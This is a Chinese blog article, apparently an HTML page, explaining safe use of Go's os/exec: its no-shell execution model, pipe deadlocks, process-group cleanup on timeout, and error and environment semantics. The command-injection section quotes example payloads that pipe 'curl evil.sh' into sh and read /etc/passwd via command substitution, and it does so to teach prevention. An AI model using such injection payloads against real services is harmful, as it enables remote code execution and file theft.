@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh" data-theme="light">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+    <link rel="icon" href="../../../images/favicon.jpeg" type="image/jpeg">
+    <link rel="apple-touch-icon" href="../../../images/logo.jpeg">
+    <title>Go 中执行外部命令的正确姿势 - 资深码农</title>
+    <link rel="stylesheet" href="../../../css/style.min.css?v=4">
+    <link rel="preconnect" href="https://miaoda.feishu.cn" crossorigin>
+
+    <link rel="stylesheet" href="https://miaoda.feishu.cn/fonts/css2?family=Noto+Sans+SC:wght@400;500;700;800;900&family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+        <meta name="description" content="os/exec 不经过 shell，参数以数组原样交付内核，所以没有通配符展开、管道与重定向语义，这既是它的安全属性也是困惑的根源。本文讲清 Run、Output、CombinedOutput、Start 加 Wait 与 Pipe 五种方式的取舍和真正的死锁位置，CommandContext 只杀直接子进程时如何用 Setpgid、Cancel 与 WaitDelay 收拾进程组，ExitError 与 exec.Error 的退出码判读，Env 与 Dir 的继承语义，PATH 查找与 ErrDot，stdin 流式喂数据、大输出的内存控制，以及 Windows 与类 Unix 的执行模型差异。">
+    <meta name="keywords" content="Go,Go 语言总览,AI,LLM,RAG,云原生,Nginx,Docker,MySQL,Redis,Elasticsearch,Python,技术博客,程序员,踩坑,实践">
+    <meta name="author" content="资深码农">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="googlebot" content="index, follow">
+    <meta name="bingbot" content="index, follow">
+    <meta name="baiduspider" content="index, follow">
+    <!-- AI crawler friendly: explicitly allow indexing -->
+    <meta name="GPTBot" content="index, follow">
+    <meta name="Claude-Web" content="index, follow">
+    <meta name="PerplexityBot" content="index, follow">
+    <meta name="CCBot" content="index, follow">
+    <meta name="Google-Extended" content="index, follow">
+    <link rel="canonical" href="https://www.yijunjun.asia/programming/go/exec/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="Go 中执行外部命令的正确姿势 - 资深码农">
+    <meta property="og:description" content="os/exec 不经过 shell，参数以数组原样交付内核，所以没有通配符展开、管道与重定向语义，这既是它的安全属性也是困惑的根源。本文讲清 Run、Output、CombinedOutput、Start 加 Wait 与 Pipe 五种方式的取舍和真正的死锁位置，CommandContext 只杀直接子进程时如何用 Setpgid、Cancel 与 WaitDelay 收拾进程组，ExitError 与 exec.Error 的退出码判读，Env 与 Dir 的继承语义，PATH 查找与 ErrDot，stdin 流式喂数据、大输出的内存控制，以及 Windows 与类 Unix 的执行模型差异。">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://www.yijunjun.asia/programming/go/exec/">
+    <meta property="og:site_name" content="资深码农">
+    <meta property="og:locale" content="zh_CN">
+    <meta property="article:published_time" content="2026-09-19">
+    <meta property="article:modified_time" content="2026-09-19">
+    <meta property="og:image" content="https://www.yijunjun.asia/images/og-image.jpg">
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Go 中执行外部命令的正确姿势 - 资深码农">
+    <meta name="twitter:description" content="os/exec 不经过 shell，参数以数组原样交付内核，所以没有通配符展开、管道与重定向语义，这既是它的安全属性也是困惑的根源。本文讲清 Run、Output、CombinedOutput、Start 加 Wait 与 Pipe 五种方式的取舍和真正的死锁位置，CommandContext 只杀直接子进程时如何用 Setpgid、Cancel 与 WaitDelay 收拾进程组，ExitError 与 exec.Error 的退出码判读，Env 与 Dir 的继承语义，PATH 查找与 ErrDot，stdin 流式喂数据、大输出的内存控制，以及 Windows 与类 Unix 的执行模型差异。">
+    <meta name="twitter:image" content="https://www.yijunjun.asia/images/og-image.jpg">
+    <meta property="article:author" content="资深码农">
+    <meta property="article:section" content="编程语言与代码功底">
+    <meta property="article:tag" content="后端与编程语言">
+        <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Go 中执行外部命令的正确姿势","datePublished":"2026-09-22","dateModified":"2026-09-22","description":"os/exec 不经过 shell，参数以数组原样交付内核，所以没有通配符展开、管道与重定向语义，这既是它的安全属性也是困惑的根源。本文讲清 Run、Output、CombinedOutput、Start 加 Wait 与 Pipe 五种方式的取舍和真正的死锁位置，CommandContext 只杀直接子进程时如何用 Setpgid、Cancel 与 WaitDelay 收拾进程组，ExitError 与 exec.Error 的退出码判读，Env 与 Dir 的继承语义，PATH 查找与 ErrDot，stdin 流式喂数据、大输出的内存控制，以及 Windows 与类 Unix 的执行模型差异。","url":"https://www.yijunjun.asia/programming/go/exec/","inLanguage":"zh-CN","author":{"@type":"Person","name":"资深码农","url":"https://www.yijunjun.asia"},"publisher":{"@type":"Person","name":"资深码农","url":"https://www.yijunjun.asia"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.yijunjun.asia/programming/go/exec/"},"articleSection":"后端与编程语言"}</script>
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"position": 1, "name": "主页", "item": "https://www.yijunjun.asia/"}, {"position": 2, "name": "编程语言与代码功底", "item": "https://www.yijunjun.asia/programming/"}, {"position": 3, "name": "Go 语言总览", "item": "https://www.yijunjun.asia/programming/go/"}, {"position": 4, "name": "Go os/exec", "item": "https://www.yijunjun.asia/programming/go/exec/"}]}</script>
+    <link rel="alternate" type="application/rss+xml" title="资深码农 RSS" href="../../../feed.xml">
+    <link rel="alternate" type="application/atom+xml" title="资深码农 Atom" href="../../../atom.xml">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "exec.Command 为什么不展开通配符，也不支持管道？", "acceptedAnswer": {"@type": "Answer", "text": "os/exec 不启动 shell，Command 收到的程序名和参数会被组装成 argv 数组直接交给 execve，中间没有任何解释器做分词与展开。所以星号、竖线、大于号、美元符号都只是普通字符，会原样成为目标程序的一个参数。需要这些语义就自己在 Go 里实现：通配符用 filepath.Glob，管道把前一个命令的 StdoutPipe 接到后一个命令的 Stdin，重定向把 Stdout 指向打开的文件。"}}, {"@type": "Question", "name": "Output 不读 stderr 会不会导致管道死锁？", "acceptedAnswer": {"@type": "Answer", "text": "不会，这是流传很广的误解。调用 Output 时如果 Stderr 字段为空，os/exec 会自动为它挂一个只保留首尾、上限 32 KiB 的缓冲区，并由独立的 goroutine 持续读取，管道不会被写满。真正的死锁出现在你自己用 StdoutPipe 和 StderrPipe 时先把一路读到 EOF 再读另一路，或者在管道还没读完就调用 Wait。两个管道必须由两个 goroutine 并行读。"}}, {"@type": "Question", "name": "CommandContext 超时后子进程还在跑，怎么彻底清理？", "acceptedAnswer": {"@type": "Answer", "text": "CommandContext 的默认取消动作是给直接子进程发 Kill，它派生的孙进程不受影响，会变成孤儿继续运行，还可能一直占着监听端口。正确做法是把 SysProcAttr 的 Setpgid 打开让子进程自成进程组，再覆盖 Cmd.Cancel，用负的 PID 向整个进程组发信号；同时设置 WaitDelay 给管道拷贝一个收尾上限，避免孙进程攥着继承来的管道让 Wait 永久挂住。"}}, {"@type": "Question", "name": "WaitDelay 到底是什么超时，能不能当执行超时用？", "acceptedAnswer": {"@type": "Answer", "text": "不能。WaitDelay 不是命令的执行超时，而是在命令已经被取消或进程已经退出之后，留给标准输入输出拷贝收尾的宽限期。宽限期一过，os/exec 会强制关掉这些管道并让 Wait 返回 ErrWaitDelay。只设 WaitDelay 而不设 context，命令可以跑到天荒地老。执行超时要靠 context.WithTimeout，两者配合使用。"}}, {"@type": "Question", "name": "怎么区分命令没找到和命令返回了非零退出码？", "acceptedAnswer": {"@type": "Answer", "text": "这是两类完全不同的错误。程序找不到或不可执行时，错误是 exec.Error 类型，可以用 errors.Is 比对 exec.ErrNotFound，这种情况根本没有退出码，别去调 ExitCode。程序跑起来了但非零退出，错误是 exec.ExitError，ExitCode 才有意义；如果进程是被信号打死的，ExitCode 返回负一，真实原因要从 ProcessState 里取 WaitStatus 的信号值。另外 grep 没匹配到内容返回 1 是正常语义，不是故障。"}}, {"@type": "Question", "name": "什么时候干脆不要调外部命令？", "acceptedAnswer": {"@type": "Answer", "text": "只要标准库能覆盖就别 fork。遍历目录用 os.ReadDir 和 filepath.WalkDir，下载用 net/http，打包用 archive/tar 配 compress/gzip，解析 JSON 用 encoding/json，哈希与签名用 crypto 下的包。换掉外部命令省下的不只是一次进程创建，更重要的是不用再解析人类可读的输出文本、不用担心目标机上的命令版本和 locale 不一致、也不用把 PATH 当成部署契约。"}}]}</script>
+</head>
+<body>
+    <div class="reading-progress"></div>
+
+    <header class="site-header">
+        <div class="header-inner">
+            <a href="./" class="header-brand">
+                <span class="logo-mark">~$</span>
+                <span class="blog-title">资深码农</span>
+            </a>
+            <button class="nav-toggle" aria-label="打开导航菜单" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+            <nav class="header-nav" aria-label="分组导航"><a href="../../../programming/" data-group="programming" class="active">编程</a><a href="../../../database/" data-group="database">数据库</a><a href="../../../api/" data-group="api">接口</a><a href="../../../architecture/" data-group="architecture">架构</a><a href="../../../devops/" data-group="devops">运维</a><a href="../../../observability/" data-group="observability">可观测</a><a href="../../../frontend/" data-group="frontend">前端</a><a href="../../../tools/" data-group="tools">工具</a><a href="../../../ai/" data-group="ai">AI</a><a href="../../../life/" data-group="life">生活</a></nav>
+            <div class="header-search">
+                <svg class="search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+                <input type="search" id="search-input" placeholder="搜索...">
+                <div class="search-results" id="search-results"></div>
+            </div>
+            <button class="theme-toggle" title="切换主题" aria-label="切换主题">
+                <span class="icon-moon"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></span>
+                <span class="icon-sun"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4M2 12h2m16 0h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg></span>
+            </button>
+        </div>
+    </header>
+
+    <div id="main-area">
+        <div class="breadcrumbs">
+<a href="../../../index.html">主页</a><span class="separator">/</span><a href="../../index.html">编程语言与代码功底</a><span class="separator">/</span><a href="../index.html">Go 运行时模型：GMP 调度、内存分配与 GC</a><span class="separator">/</span><span>Go os/exec</span>
+</div>
+
+        <div id="content-wrapper" class="article-layout">
+            <main id="body-content">
+                <article class="article">
+                    <header class="article-header">
+                        <h1 class="article-title">Go 中执行外部命令的正确姿势</h1>
+                        <div class="article-meta">
+                            <span class="meta-item">🏷️ Go 语言</span>
+                            <span class="meta-item reading-time"></span>
+                        </div>
+                    </header>
+                    <div class="article-content">
+<p>把 Go 服务当胶水层去调外部命令，是后端绕不开的活：调 git 同步仓库、调 ffmpeg 转码、调内部 CLI 搬数据、调 iptables 改规则。标准库 <code>os/exec</code> 表面只有几个函数，但它的线上事故密度相当高——命令注入、管道死锁、超时杀不干净、退出码判反、环境变量泄漏，追到底几乎都是对同一件事的误解：<strong>它不经过 shell</strong>。这篇先把执行模型说清楚，再按事故类型逐个拆。</p>
+
+<h2>执行模型：os/exec 不是 system()</h2>
+<p>C 的 <code>system("ls *.txt")</code> 实际执行的是 <code>/bin/sh -c "ls *.txt"</code>，分词、通配符展开、管道、重定向全由 shell 完成。<code>os/exec</code> 走的是另一条路：<code>exec.Command(name, args...)</code> 只是把程序名和参数组装成一个 argv 数组，<code>Start</code> 时在子进程里直接 <code>execve</code>，中间没有任何解释器。</p>
+<p>这一点既是它最重要的安全属性，也是新人困惑的唯一来源：<strong>你写下的每个参数都会原封不动地成为 argv 的一个元素</strong>，不会被拆开，也不会被展开，你也不需要（更不应该）自己给它加引号。</p>
+<div class="mermaid">
+flowchart TB
+    subgraph GO["Go 侧"]
+        A["构造 Cmd：程序名与参数数组"]
+        B["LookPath 解析程序名"]
+        C["Start：克隆进程后 execve"]
+    end
+    subgraph D1["默认路径：直接执行目标程序"]
+        D["参数数组原样交给内核"]
+        E["不分词、不展开通配符"]
+        F["没有管道与重定向语义"]
+    end
+    subgraph D2["显式经过解释器的路径"]
+        G["把整条命令交给 shell"]
+        H["由 shell 负责分词与展开"]
+        I["拼接不可信输入即命令注入"]
+    end
+    A --> B
+    B --> C
+    C --> D
+    D --> E
+    E --> F
+    C --> G
+    G --> H
+    H --> I
+</div>
+<p>于是所有 shell 语法在这里都退化成普通字符串。下面这张表是排查「命令在终端里能跑，在 Go 里就报文件不存在」这类问题的标准清单：</p>
+<table>
+<thead><tr><th>你以为会发生的</th><th>直接执行时的实际结果</th><th>在 Go 里的正确做法</th></tr></thead>
+<tbody>
+<tr><td>通配符 <code>*.log</code> 被展开成文件列表</td><td>目标程序收到字面量星号，多数 CLI 报「no such file」</td><td><code>filepath.Glob</code> 展开后逐个追加到 args</td></tr>
+<tr><td>竖线把前一个命令的输出接给后一个</td><td>竖线变成前一个命令的普通参数</td><td>两个 <code>Cmd</code>，后者的 <code>Stdin</code> 接前者的 <code>StdoutPipe</code>，各自 <code>Start</code>，都要 <code>Wait</code></td></tr>
+<tr><td>输出重定向到文件</td><td>大于号变成普通参数</td><td><code>cmd.Stdout = f</code>，f 是打开的 <code>*os.File</code>，零拷贝直通</td></tr>
+<tr><td><code>2&gt;&amp;1</code> 把 stderr 并到 stdout</td><td>这三个字符成为一个参数</td><td><code>cmd.Stderr = cmd.Stdout</code>（同一个值时 exec 会复用同一个 fd）</td></tr>
+<tr><td><code>$HOME</code>、<code>~</code>、<code>$(date)</code> 被求值</td><td>字面量，不求值</td><td><code>os.Getenv</code> / <code>os.UserHomeDir</code> / <code>time.Now</code> 自己拼</td></tr>
+<tr><td><code>&amp;&amp;</code> 串联多条命令</td><td>变成参数</td><td>顺序执行多个 <code>Cmd</code>，前一个失败就中断</td></tr>
+<tr><td>参数里的引号用来分组</td><td>Go 不解析引号，参数边界完全由数组决定</td><td>一个参数就是数组的一个元素，自己加引号反而会把引号传进去</td></tr>
+</tbody>
+</table>
+
+<h2>命令注入：拼字符串的那一刻就已经输了</h2>
+<p>因为默认不走 shell，<code>os/exec</code> 天生没有注入面。注入是被人主动引入的——通常长这样：</p>
+<p><code>exec.Command("sh", "-c", "tar czf /tmp/out.tgz " + userPath)</code></p>
+<p>一旦有了 <code>sh -c</code> 和字符串拼接，你就把参数边界的解释权交还给了 shell。用户传 <code>a; curl evil.sh | sh</code> 就是远程执行；传 <code>$(cat /etc/passwd)</code> 就是任意文件读取。这里要特别强调两个错误认知：</p>
+<ul>
+<li><strong>「加引号就安全了」是错的。</strong> 把变量包进单引号只是把攻击面从分号换成单引号——攻击者输入一个单引号就能闭合它。手写 shell 转义在多层嵌套、换行符、locale 差异下几乎不可能做对。</li>
+<li><strong>「过滤掉分号和竖线就安全了」也是错的。</strong> shell 的元字符集合远不止这两个，换行、反引号、<code>$()</code>、<code>&amp;</code>、<code>&gt;</code>、大括号展开都能达成目的；黑名单永远漏。</li>
+</ul>
+<p>正确的心智模型是：<strong>参数走数组，数据永远不参与命令结构的构造。</strong> 如果实在必须用 <code>sh -c</code>（比如确实需要管道且不想写两个 Cmd），那么脚本文本必须是写死的常量，外部数据只能通过 <strong>环境变量</strong> 或 <strong>位置参数</strong>（<code>sh -c 'cmd "$1"' -- value</code>）传进去，绝不进入脚本文本本身。另外别忘了参数注入：即使不经 shell，用户可控的参数如果以连字符开头，也可能被目标程序当成选项（典型是 <code>--output</code>、<code>--upload-file</code>），所以用户数据前面要加 <code>--</code> 分隔符，或者校验它不以连字符开头。</p>
+
+<h2>五种取输出方式与真正的死锁位置</h2>
+<p><code>Run</code>、<code>Output</code>、<code>CombinedOutput</code> 的区别不只是「返不返回输出」，关键差异在<strong>谁负责读子进程的管道</strong>。理解这一点，才能判断死锁风险到底在哪。</p>
+<div class="mermaid">
+flowchart TB
+    S{"输出量可控且只要最终结果"}
+    S -->|"是"| T{"要区分 stdout 与 stderr"}
+    T -->|"要区分"| O["Output：stdout 全量进内存，stderr 自动进上限缓冲"]
+    T -->|"不必区分"| CO["CombinedOutput：两路合并到同一个缓冲"]
+    S -->|"否，输出很大或很长"| L{"要边跑边处理"}
+    L -->|"要"| PIPE["StdoutPipe 与 StderrPipe，各配一个 goroutine"]
+    L -->|"不要，直接落盘"| R{"要阻塞当前 goroutine"}
+    R -->|"阻塞"| RUN["Run：Stdout 直接指向打开的文件"]
+    R -->|"不阻塞"| SW["Start 之后由专门 goroutine 调 Wait"]
+</div>
+<table>
+<thead><tr><th>方式</th><th>谁在读子进程管道</th><th>输出容量</th><th>返回时机</th><th>真实死锁风险</th></tr></thead>
+<tbody>
+<tr><td><code>Run</code></td><td>你指定的 Stdout/Stderr；为空则接 <code>/dev/null</code></td><td>取决于你的 writer</td><td>子进程退出且拷贝 goroutine 结束</td><td>低。writer 是 <code>*os.File</code> 时连 goroutine 都不需要</td></tr>
+<tr><td><code>Output</code></td><td>exec 自己；Stderr 为空时自动挂 32 KiB 上限缓冲</td><td>stdout 全量进内存</td><td>同上</td><td>低。<strong>不会因为「没读 stderr」而死锁</strong></td></tr>
+<tr><td><code>CombinedOutput</code></td><td>exec 自己，两路指向同一个 buffer</td><td>全量进内存</td><td>同上</td><td>低，但两路按字节交错，可能把一行日志劈成两半</td></tr>
+<tr><td><code>Start</code> + <code>Wait</code></td><td>同 <code>Run</code></td><td>同 <code>Run</code></td><td><code>Start</code> 立即返回，<code>Wait</code> 阻塞</td><td>忘记 <code>Wait</code> 就留下僵尸进程并泄漏管道 fd</td></tr>
+<tr><td><code>StdoutPipe</code> / <code>StderrPipe</code></td><td>你自己</td><td>流式，内存恒定</td><td>你读到 EOF 之后再 <code>Wait</code></td><td><strong>高</strong>：串行读两个管道、或先 <code>Wait</code> 再读</td></tr>
+</tbody>
+</table>
+<p>这里纠正两个很常见的说法。第一，<strong>「用 Output 时 stderr 没人读会把子进程堵死」不成立</strong>：<code>Output</code> 在 <code>Stderr</code> 为 nil 时会替你挂一个只保留首尾、总量 32 KiB 的缓冲，并由独立 goroutine 持续排空管道，这也是 <code>ExitError.Stderr</code> 字段数据的来源——顺带一提，这个字段<strong>只有 <code>Output</code> 才会填</strong>，用 <code>Run</code> 时它永远是空的。第二，<strong>「CombinedOutput 让两个 goroutine 并发写同一个 buffer，会数据竞争」也不成立</strong>：exec 发现 <code>Stderr</code> 与 <code>Stdout</code> 是同一个值时，会让子进程的两个 fd 指向同一个管道，父侧只有一个读者。</p>
+<p>真正的死锁只发生在你接管管道之后。内核管道缓冲是有限的（Linux 默认 64 KiB），先把 stdout 读到 EOF 再去读 stderr，子进程就会在 stderr 的 <code>write</code> 上阻塞，进而不再产出 stdout，双方互等：</p>
+<div class="mermaid">
+sequenceDiagram
+    participant P as 父进程读取方
+    participant K as 内核管道缓冲
+    participant C as 子进程
+    C->>K: 往 stdout 写数据
+    P->>K: 读 stdout
+    C->>K: 往 stderr 写数据
+    Note over K: stderr 侧缓冲被写满，没有读者
+    C--xK: 下一次写 stderr 阻塞在系统调用里
+    Note over C: 子进程卡死，stdout 不再产出
+    P->>K: 继续读 stdout，永远读不到 EOF
+    Note over P: Wait 永不返回，双方互等
+</div>
+<p>另一个同源的错误是<strong>先调 <code>Wait</code> 再读管道</strong>。<code>Wait</code> 会在进程回收后关闭这些管道，你后续读到的只是缓冲里的残余，看起来像「输出被截断」。文档写得很明确：管道必须全部读完之后再 <code>Wait</code>。</p>
+
+<h2>取消与超时：CommandContext 只杀直接子进程</h2>
+<p><code>exec.CommandContext</code> 做的事很有限：context 完成时调用 <code>Cmd.Cancel</code>，默认实现是给<strong>直接子进程</strong>发 Kill。如果子进程是个 shell 脚本、一个 <code>make</code>、或者任何会 fork 的程序，它的孩子不会收到任何信号，会变成孤儿继续跑——最典型的症状就是重试时报「端口已被占用」，因为上一轮的孙进程还攥着监听 socket。</p>
+<div class="mermaid">
+stateDiagram-v2
+    [*] --> Built
+    Built --> Failed: LookPath 或 clone 失败
+    Built --> Running: Start 成功
+    Running --> Exited: 子进程自行结束
+    Running --> Canceled: context 完成
+    Canceled --> Exited: 执行 Cancel，默认只 Kill 直接子进程
+    Canceled --> Draining: 孙进程仍持有继承来的管道
+    Draining --> Exited: WaitDelay 到期，强制关管道
+    Exited --> [*]: Wait 返回，进程被回收
+    Failed --> [*]
+    Built: 已构造，未启动
+    Running: 运行中
+    Canceled: 已取消
+    Draining: 收尾宽限期
+    Exited: 已退出
+    Failed: 启动失败
+    note right of Draining
+        不调用 Wait 会留下僵尸进程
+        Wait 只能调用一次，第二次返回错误
+    end note
+</div>
+<table>
+<thead><tr><th>字段</th><th>可用版本</th><th>零值行为</th><th>漏设或设错的后果</th></tr></thead>
+<tbody>
+<tr><td><code>Cmd.Cancel</code></td><td>Go 1.20+</td><td><code>CommandContext</code> 填入「Kill 直接子进程」</td><td>孙进程成孤儿，端口与临时文件不释放</td></tr>
+<tr><td><code>Cmd.WaitDelay</code></td><td>Go 1.20+</td><td>0，表示无限等 I/O 拷贝收尾</td><td>孙进程继承了管道并一直不退出，<code>Wait</code> 永久挂住</td></tr>
+<tr><td><code>SysProcAttr.Setpgid</code></td><td>类 Unix</td><td>false，子进程留在父进程组</td><td>没有进程组，无法一次性清理整棵进程树</td></tr>
+<tr><td><code>SysProcAttr.Pdeathsig</code></td><td>仅 Linux</td><td>0，不发信号</td><td>父进程被 kill -9 后，子进程还活着继续消耗资源</td></tr>
+<tr><td><code>Cmd.Err</code></td><td>Go 1.20+</td><td><code>Command</code> 里 LookPath 失败时置位</td><td>忽略它的话错误延迟到 <code>Start</code> 才暴露，日志上下文已丢</td></tr>
+</tbody>
+</table>
+<p>还有一个反复被误解的点：<strong><code>WaitDelay</code> 不是执行超时</strong>。它是「取消动作发生之后（或进程已退出之后），留给标准输入输出拷贝收尾的宽限期」，超时就强制关管道并让 <code>Wait</code> 返回 <code>exec.ErrWaitDelay</code>。只设 <code>WaitDelay</code> 而不设 context，命令可以跑到天荒地老。两者是配合关系，不是替代关系。</p>
+<p>下面这段是我在生产里实际用的封装：超时、进程组清理、环境白名单、输出限长一次到位。</p>
+<pre><code class="language-go">type limitedWriter struct {
+    w io.Writer
+    n int64 // 还允许写入的字节数
+}
+
+// 超额部分直接丢弃但仍然返回成功，这样子进程不会收到 EPIPE 提前死掉，
+// 也不会让 io.Copy 报 ErrShortWrite。
+func (l *limitedWriter) Write(p []byte) (int, error) {
+    total := len(p)
+    if l.n &lt;= 0 {
+        return total, nil
+    }
+    if int64(total) &gt; l.n {
+        p = p[:l.n]
+    }
+    n, err := l.w.Write(p)
+    l.n -= int64(n)
+    if err != nil {
+        return n, err
+    }
+    return total, nil
+}
+
+func runIsolated(parent context.Context, timeout time.Duration,
+    name string, args ...string) ([]byte, error) {
+
+    ctx, cancel := context.WithTimeout(parent, timeout)
+    defer cancel()
+
+    // 参数以数组传递，全程没有字符串拼接，注入面为零。
+    cmd := exec.CommandContext(ctx, name, args...)
+
+    // Env 非 nil 是"完整替换"而不是"追加"：必须把子进程真正需要的变量列全，
+    // 否则它自己再 exec 时会因为没有 PATH 而失败。
+    cmd.Env = []string{
+        "PATH=/usr/local/bin:/usr/bin:/bin",
+        "LANG=C.UTF-8",
+        "HOME=/tmp",
+    }
+    cmd.Dir = "/srv/workdir"
+
+    // 让子进程自成进程组，这是能够按组清理孙进程的前提。
+    cmd.SysProcAttr = &amp;syscall.SysProcAttr{Setpgid: true}
+
+    // 覆盖默认 Cancel：负 PID 表示"整个进程组"。
+    // 先 SIGTERM 给一次优雅退出的机会，再兜底 SIGKILL 会更友好，这里从简。
+    cmd.Cancel = func() error {
+        return syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
+    }
+
+    // 取消之后最多再给 3 秒收尾；超了就关管道并返回 ErrWaitDelay，
+    // 避免孙进程攥着继承来的 fd 把 Wait 永久挂住。
+    cmd.WaitDelay = 3 * time.Second
+
+    var buf bytes.Buffer
+    lw := &amp;limitedWriter{w: &amp;buf, n: 4 &lt;&lt; 20} // 最多收 4 MiB
+    cmd.Stdout = lw
+    cmd.Stderr = lw // 同一个值，exec 会复用同一个子进程 fd
+
+    err := cmd.Run()
+    return buf.Bytes(), err
+}</code></pre>
+
+<h2>退出码与错误判读</h2>
+<p><code>os/exec</code> 的错误分两大类，混在一起处理是监控告警失真的主要原因：一类是<strong>没启动起来</strong>（<code>*exec.Error</code>，压根没有退出码），一类是<strong>启动了但非零退出</strong>（<code>*exec.ExitError</code>，有退出码）。</p>
+<table>
+<thead><tr><th>能 As/Is 出什么</th><th>含义</th><th>有退出码吗</th><th>常见误判</th></tr></thead>
+<tbody>
+<tr><td><code>*exec.Error</code>，<code>Is(err, exec.ErrNotFound)</code></td><td>PATH 里找不到该程序，或文件不可执行</td><td><strong>没有</strong></td><td>当成退出码 127 上报；实际上 127 是 shell 的约定，这里没走 shell</td></tr>
+<tr><td><code>Is(err, exec.ErrDot)</code></td><td>程序名解析到了当前目录下的相对路径，Go 1.19 起默认拒绝</td><td>没有</td><td>误判成权限问题；正确做法是显式给绝对路径</td></tr>
+<tr><td><code>*exec.ExitError</code></td><td>跑完了，退出码非零</td><td>有，<code>ExitCode()</code></td><td><code>grep</code> 无匹配返回 1、<code>diff</code> 有差异返回 1，都是正常语义，不是故障</td></tr>
+<tr><td><code>ExitError</code> 且 <code>WaitStatus.Signaled()</code></td><td>被信号终止（含我们自己发的 SIGKILL）</td><td><code>ExitCode()</code> 返回 <strong>-1</strong></td><td>把 -1 当业务退出码写进指标</td></tr>
+<tr><td><code>exec.ErrWaitDelay</code></td><td>进程已退出但 I/O 拷贝没收尾，被强制关闭</td><td>可能同时有</td><td>报成「命令执行失败」，其实命令本身可能已经成功</td></tr>
+<tr><td><code>ctx.Err() == context.DeadlineExceeded</code></td><td>我们自己超时把它杀了</td><td>通常同时拿到 signal: killed</td><td>只看 err 文本，把超时报成「程序崩溃」</td></tr>
+</tbody>
+</table>
+<p>最后一行是重点：被 SIGKILL 打死的进程，<code>Run</code> 返回的往往只是一个 <code>ExitError</code>，文本是 <code>signal: killed</code>，<strong>光看 err 区分不出「它自己崩了」和「我们超时杀的」</strong>。可靠的判法是先看 <code>ctx.Err()</code>：</p>
+<pre><code class="language-go">func classify(ctx context.Context, err error) string {
+    if err == nil {
+        return "ok"
+    }
+    // 1) 先问 context：被我们杀掉时 err 通常只有 signal: killed，
+    //    只有 ctx.Err() 能区分"超时"和"程序自己崩了"。
+    if ctxErr := ctx.Err(); ctxErr != nil {
+        if errors.Is(ctxErr, context.DeadlineExceeded) {
+            return "timeout"
+        }
+        return "canceled_by_caller"
+    }
+    // 2) 根本没启动：LookPath 失败、目标不可执行。此时没有退出码。
+    var startErr *exec.Error
+    if errors.As(err, &amp;startErr) {
+        return "not_executable: " + startErr.Name
+    }
+    // 3) 启动了但非零退出，这才有退出码。
+    var exitErr *exec.ExitError
+    if errors.As(err, &amp;exitErr) {
+        if ws, ok := exitErr.Sys().(syscall.WaitStatus); ok &amp;&amp; ws.Signaled() {
+            // ExitCode() 在这种情况下是 -1，真实原因在 WaitStatus 里。
+            return "signaled: " + ws.Signal().String()
+        }
+        // ExitError.Stderr 只有 Output() 才会填，Run() 时恒为空。
+        return fmt.Sprintf("exit=%d stderr=%q",
+            exitErr.ExitCode(), bytes.TrimSpace(exitErr.Stderr))
+    }
+    // 4) 进程退了但管道没收尾，被 WaitDelay 强关。
+    if errors.Is(err, exec.ErrWaitDelay) {
+        return "io_not_drained"
+    }
+    return "other: " + err.Error()
+}</code></pre>
+
+<h2>环境、工作目录与 PATH 查找</h2>
+<p>这一节的坑全部来自「零值语义」——你没显式设置的字段，行为往往不是你以为的那样。</p>
+<table>
+<thead><tr><th>Cmd 字段</th><th>零值语义</th><th>踩坑点</th></tr></thead>
+<tbody>
+<tr><td><code>Env = nil</code></td><td>继承父进程<strong>全部</strong>环境变量</td><td>把 <code>DB_PASSWORD</code>、云厂商临时凭据一并交给子进程；子进程若打印环境或崩溃转储，就是一次泄漏</td></tr>
+<tr><td><code>Env</code> 非 nil</td><td><strong>完整替换</strong>，不是追加</td><td>忘了 <code>PATH</code>，子进程内部再 exec 就失败；想「继承再改」用 <code>cmd.Environ()</code>（Go 1.19+）取基线</td></tr>
+<tr><td><code>Env</code> 里有重复 key</td><td>后出现的生效；Windows 上按大小写不敏感去重</td><td>以为前面的生效，导致覆盖顺序反了</td></tr>
+<tr><td><code>Dir = ""</code></td><td>用父进程当前目录</td><td><code>Dir</code> <strong>不影响 LookPath</strong>；但相对的可执行文件路径是子进程 chdir 之后解析的，两者基准不同</td></tr>
+<tr><td><code>Stdin = nil</code></td><td>接 <code>os.DevNull</code>，子进程立刻读到 EOF</td><td>以为子进程会等输入；反过来，设了 <code>StdinPipe</code> 不 <code>Close</code> 则子进程永远等</td></tr>
+<tr><td><code>Stdout = nil</code></td><td>丢弃</td><td>排查时什么都看不到，误以为程序没执行</td></tr>
+<tr><td><code>ExtraFiles</code></td><td>空；传入时子进程里从 fd 3 开始编号</td><td>Windows 不支持；fd 编号错位会让子进程读错文件</td></tr>
+</tbody>
+</table>
